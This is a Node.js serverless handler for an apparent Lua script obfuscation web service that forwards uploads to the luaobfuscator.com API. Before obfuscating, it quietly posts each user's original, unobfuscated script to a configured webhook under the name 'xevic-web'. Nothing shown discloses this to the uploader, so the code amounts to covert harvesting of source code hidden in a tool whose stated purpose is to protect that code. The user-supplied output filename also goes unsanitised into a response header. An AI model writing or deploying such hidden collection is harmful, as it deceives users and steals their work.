const formidable = require('formidable');
const fs = require('fs');
const FormData = require('form-data');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.statusCode = 405;
    res.end('Method Not Allowed');
    return;
  }

  const form = new formidable.IncomingForm();
  form.maxFileSize = 5 * 1024 * 1024;

  form.parse(req, async (err, fields, files) => {
    if (err) {
      res.statusCode = 400;
      res.end('Bad request');
      return;
    }

    try {
      const LUA_KEY = process.env.LUAOBFUSCATOR_API_KEY;
      const WEBHOOK_URL = process.env.WEBHOOK_URL;

      let scriptText = '';
      let inName = 'pasted_script.lua';

      if (files && files.file && files.file.size) {
        const f = files.file;
        scriptText = fs.readFileSync(f.path, 'utf8');
        inName = f.name || inName;
      } else if (fields && fields.script) {
        scriptText = String(fields.script);
      } else {
        res.statusCode = 400;
        res.end('No script or file provided');
        return;
      }

      let outName = (fields.filename || '').trim();
      if (!outName) outName = 'obfuscated.lua';
      if (!outName.toLowerCase().endsWith('.lua') && !outName.toLowerCase().endsWith('.txt')) {
        outName += '.lua';
      }

      if (WEBHOOK_URL) {
        try {
          const formData = new FormData();
          const payload = { username: 'xevic-web', content: `Original script uploaded: \`${inName}\`` };
          formData.append('payload_json', JSON.stringify(payload));
          formData.append('file', Buffer.from(scriptText, 'utf8'), { filename: inName, contentType: 'text/plain' });
          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        } catch (e) {
          console.warn('webhook error', e);
        }
      }

      let obfCode = scriptText;

      if (LUA_KEY) {
        try {
          const r1 = await fetch('https://api.luaobfuscator.com/v1/obfuscator/newscript', {
            method: 'POST',
            headers: { apikey: LUA_KEY, 'content-type': 'text/plain' },
            body: scriptText
          });
          if (r1.ok) {
            const d1 = await r1.json();
            const sessionId = d1.sessionId || d1.session_id || d1.id;
            if (sessionId) {
              const params = { MinifyAll: true, Virtualize: true, CustomPlugins: { DummyFunctionArgs: [6, 9] } };
              const r2 = await fetch('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', {
                method: 'POST',
                headers: { apikey: LUA_KEY, sessionId: sessionId, 'content-type': 'application/json' },
                body: JSON.stringify(params)
              });
              if (r2.ok) {
                const d2 = await r2.json();
                if (d2 && d2.code) obfCode = d2.code;
              }
            }
          }
        } catch (e) {
          console.warn('obfuscator API error', e);
        }
      }

      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.setHeader('Content-Disposition', `attachment; filename="${outName}"`);
      res.statusCode = 200;
      res.end(obfCode);
    } catch (e) {
      res.statusCode = 500;
      res.end('Internal server error');
    }
  });
};
